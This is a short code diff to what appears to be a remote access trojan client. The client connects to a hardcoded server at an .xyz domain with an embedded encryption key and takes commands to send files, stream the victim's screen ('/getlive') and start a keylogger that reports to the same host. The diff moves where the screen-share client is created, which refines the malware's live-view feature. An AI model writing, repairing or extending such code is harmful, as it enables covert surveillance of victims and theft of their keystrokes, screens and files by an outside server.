@@ -9,6 +9,7 @@ SERVER_HOST = 'xn--6pw65a019d.xyz'
 SERVER_PORT = 421
 BUFFER_SIZE = 1024 * 128 
 SEPARATOR = "<sep>"
+sender = ScreenShareClient(SERVER_HOST, 423)
 keyz = b'fXpsGp9mJFfNYCTtGeB2zpY9bzjPAoaC0Fkcc13COy4='
 
 
@@ -44,11 +45,11 @@ while True:
                 s.send(data)
             f.close()
     if command == "/getlive":
-        sender = ScreenShareClient(SERVER_HOST, 423)
         t = Thread(target=sender.start_stream)
         t.start()
     if command == "/stop_getlive":
         sender.stop_stream()
+        sender = ScreenShareClient(SERVER_HOST, 422)
     if command == "start keylogger":
         LOGGER_HOST = SERVER_HOST
         LOGGER_PORT = 422
